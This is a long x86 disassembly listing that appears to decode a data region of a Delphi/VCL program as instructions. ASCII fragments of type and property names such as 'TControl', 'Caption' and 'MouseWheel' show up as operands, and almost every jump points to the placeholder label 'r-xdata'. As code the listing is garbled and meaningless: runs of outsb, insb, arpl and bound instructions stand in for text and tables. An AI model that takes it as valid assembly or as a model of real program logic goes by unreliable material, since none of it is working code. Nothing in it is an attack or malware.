add [ eax ] cl
push esi
inc ebp
add [ esi + edi * 2 + 0x56300044 ] bh
inc edx
add al dh
jle r-xdata
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
inc eax
inc esp
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x4440d090
add [ ebx ] al
or al 0x54
loopne r-xdata
jae r-xdata
inc ecx
inc esp
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
push es
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
push es
je r-xdata
outsb
je r-xdata
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
inc esp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
add [ eax ] al
inc ecx
inc esp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ ecx + eax * 2 + 0x64060044 ] dl
imul eax [ edx + esi * 2 + 0x61 ] 0x67
outsd
insd
popad
je r-xdata
inc esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
add [ edx + ebx ] ch
inc edx
add [ eax - 0x23ffbde6 ] al
inc edx
add al dl
jl r-xdata
add [ eax ] al
das
add [ eax ] al
aas
inc esp
add [ edi + ebp + 0x42 ] ch
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
or [ ecx + 0x6b ] ah
inc edx
outsd
je r-xdata
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x41 ] cl
inc esp
add [ ebx ] cl
jae r-xdata
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] 0x41f4c08b
inc esp
add [ eax + 0x74614454 ] al
add [ gs : eax ] eax
inc edx
inc esp
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
lea eax [ eax ]
cwde
inc ecx
inc esp
add [ ebx ] al
insb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
inc ebp
add [ eax ] bl
jg r-xdata
add [ eax ] dh
push esi
add [ edx + ebx ] dl
jge r-xdata
inc edx
add ah bl
outsd
insb
jae r-xdata
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x17ffbe72 ] cl
lodsb [ esi ]
outsd
insb
jae r-xdata
int3
inc ecx
inc esp
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
inc esp
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
add ah bh
outsb
mov eax eax
hlt
or [ ebx + 0x6f ] al
outsb
je r-xdata
popad
outsd
insb
jae r-xdata
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
add [ ebp + 0x403c0040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004440 ] bh
add [ eax ] al
add [ esi + ecx * 2 + 0x35980045 ] dl
inc eax
add [ ebp + esi + 0x35a80040 ] ah
inc eax
add [ ebp + esi + 0x35a00040 ] ch
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x4bffbe71 ] ah
mov es [ ecx ]
mov esp 0xac00447c
jpo r-xdata
push esp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
inc eax
add [ eax + 0x42 ] cl
inc esp
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ ecx ] ecx
push esp
inc ebp
outsb
je r-xdata
xor [ esp + eax * 2 ] bh
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ebp + 0x61 ] cl
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x74 ] 0x657a6953
add eax 0x0
arpl [ eax + 0x6f ] bp
jb r-xdata
add ecx [ ebx ]
push esp
inc ecx
outsb
outsd
insb
jae r-xdata
dec ebp
outsd
jne r-xdata
push esp
ror [ ecx + eax * 2 + 0x44 ] 0x0
inc esp
outsd
insb
jae r-xdata
or [ eax ] al
add bh bh
xor [ esp + eax * 2 ] bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x61 ] ecx
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
jpo r-xdata
add esp edi
inc ecx
jb r-xdata
jb r-xdata
jne r-xdata
add [ eax + eax ] dl
add bh bh
xor [ esp + eax * 2 ] bh
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ebp + 0x69 ] cl
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0xac00408d
inc ebx
inc esp
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
js r-xdata
popad
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx + eax * 2 ] cl
inc esp
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add [ eax + 0x3004441 ] bl
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
add [ eax ] cl
add [ eax ] al
push [ eax ]
jl r-xdata
add [ eax + 0x42 ] bl
inc esp
imul esp [ edi + 0x68 ] 0x44425874
imul esp [ gs : edi + 0x68 ] 0x44425874
add [ eax + eax ] cl
add bh bh
dec ebp
popad
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x444424c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
xor [ esp + eax * 2 ] bh
add [ eax ] eax
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x44425874
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
dec esp
popad
add [ ecx + edx ] al
inc eax
add [ eax + 0x10 ] ch
inc eax
add al al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ecx + edx ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx ] bh
add al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push ebx
push 0xb746669
push esp
push 0x53746669
je r-xdata
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
add [ ecx ] al
push esp
push ebx
popad
je r-xdata
inc edx
jne r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x41 ] cl
inc esp
add [ eax ] al
adc [ eax ] al
nop
cwde
inc ebp
inc esp
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
pop ecx
inc ecx
add [ eax + r-xdata ] dl
push 0xc0004010
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
jb r-xdata
add al 0x11
inc eax
add al ch
cmp eax [ eax + eax + 0x40 ]
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
cmp al 0x10
inc esi
inc esp
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
call 0x40448a78
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push esp
dec ebx
jns r-xdata
inc esp
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] al
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
adc [ ebp + 0x44 ] al
add [ eax ] cl
push cs
push esp
inc ebx
push 0x4007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp + 0x45100040 ] cl
inc esp
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
add al 0x11
inc eax
add [ eax + 0x3c00443e ] cl
adc [ eax ] al
cmp al 0x10
inc eax
add [ ebp + 0x47040040 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ esi + eax * 2 + 0xe080044 ] bl
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
add al 0x11
inc eax
add al al
pop ecx
inc ecx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x44880040 ] cl
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x45f80040 ] cl
inc esp
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] al
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
outsb
je r-xdata
je r-xdata
jb r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add [ eax + 0x3c00443e ] cl
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + 0x41 ] cl
inc esp
add [ eax ] al
adc [ eax ] al
nop
xchg esp eax
inc edi
inc esp
add [ eax ] cl
or al 0x54
add al 0x11
outsb
je r-xdata
push ebx
add ecx [ eax ]
push es
add al 0x11
inc eax
add ah cl
inc eax
inc esp
add al al
pop ecx
inc ecx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc ebx
jpe r-xdata
dec ebp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
fmul [ eax + 0x44 ]
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
in al dx
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
mov [ esi ] bh
inc esp
add [ eax + ecx * 2 + 0x44 ] cl
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x444a60c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add ah ch
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] al
inc eax
add ah ch
dec ebp
inc esp
add [ eax + 0x4455 ] ch
adc [ eax ] al
add [ eax + 0x44 ] cl
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
pushad
dec edx
inc esp
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x4449d8c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bl
dec esp
inc esp
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x5c1fffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax ] al
outsd
inc ecx
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
jo r-xdata
add [ edi + ebp * 2 + 0x41 ] ah
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add al al
pop ecx
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
dec eax
dec ecx
inc esp
add [ eax ] cl
lea eax [ eax ]
js r-xdata
jbe r-xdata
add dl ah
dec ebp
inc esp
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
mov al 0x44
add [ eax - 0x4bffbb5c ] bh
mov es [ ecx ]
mov [ eax - 0x7ba3ffbc ] dh
inc esp
add al cl
add [ eax + eax - 0x64 ] 0xffffff8d
inc esp
add [ ecx + ebx ] cl
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ eax + eax * 4 - 0x60afffbc ] cl
inc esp
add [ edi + ebx * 4 + 0x44 ] cl
add [ eax ] bl
inc esp
add al dl
add [ eax + eax + 0x3c ] 0x8a
inc esp
add [ eax - 0x37ffbb77 ] ah
xchg edx eax
inc esp
add [ eax ] bl
add [ eax + eax + 0x1c ] 0x82
inc esp
add [ eax - 0x4e ] bl
inc esp
add [ edx + esi * 4 - 0x727bffbc ] al
inc esp
add [ ebx + eax * 4 - 0x70efffbc ] dl
inc esp
add [ eax - 0x63ffbb72 ] cl
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ edx + 0x44 ] cl
add [ eax ] cl
mov bl 0x44
add [ eax - 0x3ffbb6c ] cl
xchg esp eax
inc esp
add [ eax - 0x7b ] cl
inc esp
add ah bl
xchg esp eax
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 ] al
inc esp
add al dh
dec ebp
inc esp
add [ eax ] al
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add al al
pop ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
aam 0x4a
inc esp
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ecx + eax * 4 + 0x44 ] ah
add al al
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_444f65
aas
inc esp
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add al ah
sbb [ edx ] eax
lodsb [ esi ]
mov ah 0x44
add [ edx + ebx ] dl
inc edx
add al dh
jle r-xdata
add [ eax ] bh
push esi
inc ebp
add [ eax ] bh
jg r-xdata
add [ eax + 0x1a ] cl
inc edx
add [ edi + edi * 2 + 0x19980044 ] bl
inc edx
add [ edx + ebx ] ch
inc edx
add [ eax - 0x23ffbde6 ] al
jge r-xdata
dec ecx
insd
add [ eax + 0x56 ] al
inc ebp
add al bl
mov ah 0x44
add [ eax + eax * 4 ] ch
inc esp
add [ eax + eax * 4 + 0x44 ] ch
add [ eax + 0x7f ] bl
inc esp
add [ esi + edx * 2 + 0x45 ] dl
add [ eax + 0x56 ] bl
inc ebp
add [ edi + edi * 2 + 0x44 ] bh
add ah ch
jl r-xdata
add [ ebp + edx * 2 + 0x45 ] bh
add [ eax + 0x7e ] dl
inc esp
add [ ebp + edx * 2 - 0x4b2fffbb ] ah
inc esp
add al cl
jg r-xdata
add [ esp + edx * 2 ] ecx
inc edx
outsd
jb r-xdata
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
jae r-xdata
add [ 0x6e695754 ] dl
inc ebx
outsd
outsb
je r-xdata
add [ esi + edi * 2 + 0x55f40044 ] al
inc ebp
add [ eax ] cl
push esi
inc ebp
add [ esi + edi * 2 + 0x56300044 ] bh
inc ebp
add [ eax ] bl
jg r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
inc esp
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
